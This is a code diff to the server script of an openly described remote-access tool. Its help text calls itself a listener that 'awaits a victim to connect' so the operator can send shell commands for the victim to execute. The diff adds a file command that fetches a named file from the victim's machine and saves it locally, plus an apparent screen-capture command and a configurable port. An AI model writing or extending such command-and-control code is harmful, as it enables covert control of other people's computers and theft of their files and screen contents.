@@ -12,43 +12,55 @@ exit_flag = False
 
 
 # Custom command behaviour
-def parse_custom_command(cmd: str) -> str:
+def parse_custom_command(cmd: list) -> list:
     global output_style
     global exit_flag
-    if cmd == "help":
+    if len(cmd) == 1:
+        print("Emtpy command")
+    elif cmd[1] == "help":
         show_help()
-    elif cmd == "exit":
+    elif cmd[1] == "exit":
         print("Exiting")
         exit_flag = True
-        return "-> exit"
-    elif cmd == "simple":
+        return "-> exit".split(" ")
+    elif cmd[1] == "simple":
         output_style = "simple"
-    elif cmd == "full":
+    elif cmd[1] == "full":
         output_style = "full"
-    return ""
+    elif cmd[1] == "file":
+        if len(cmd) == 3:
+            return cmd
+        else:
+            print("File command must have exactly 1 file name")
+    elif cmd[1] == "screen":
+        return cmd
+    else:
+        print("Invalid command")
+    return [""]
 
 
 # Create the server socket that await the victim to connect to
 def create_socket():
     global output_style
     global exit_flag
+    global port
 
     # Create socket and wait for connection
     secure_socket = SecureSocket()
-    secure_socket.wait_for_connection()
+    secure_socket.wait_for_connection(port=port)
 
     # Receive data from the client
     while True:
         prompt = "Send command (type \"-> help\" to help): " if output_style == "full" else ">"
         command = input(prompt)
+        command = command.split(" ")
 
         # Parse custom commands
-        if command.split(" ")[0] == "->":
-            custom_command = command.split(" ")[1]
-            command = parse_custom_command(custom_command)
+        if command[0] == "->":
+            command = parse_custom_command(command)
 
         # Skip empty command (new line)
-        if len(command) == 0:
+        if len(command) == 1 and command[0] == "":
             continue
 
         # Send command
@@ -72,8 +84,11 @@ def create_socket():
                 create_socket()
             else:
                 continue
-
-        print(payload.formatted_output(output_style))
+        if payload.file is not None:
+            with open(payload.file_name, "wb") as file:
+                file.write(payload.file)
+        else:
+            print(payload.formatted_output(output_style))
 
 
 def show_logo():
@@ -93,12 +108,17 @@ This is the server script that awaits a victim to connect to
 Once connected, you can send shell command for the victim to execute
 
 =========== Custom commands ==========
-+-------------+----------------------+
-| -> help     | - to see this page   |
-| -> exit     | - to exit shell      |
-| -> simple   | - to simplify output |
-| -> full     | - to use full output |
-+-------------+----------------------+
+-> help
+    - to see this page
+-> exit 
+    - to exit shell
+-> simple
+    - to simplify output
+-> full
+    - to use full output
+-> file [file_name]
+    - to get a file
+======================================
 '''
     print(content)
 
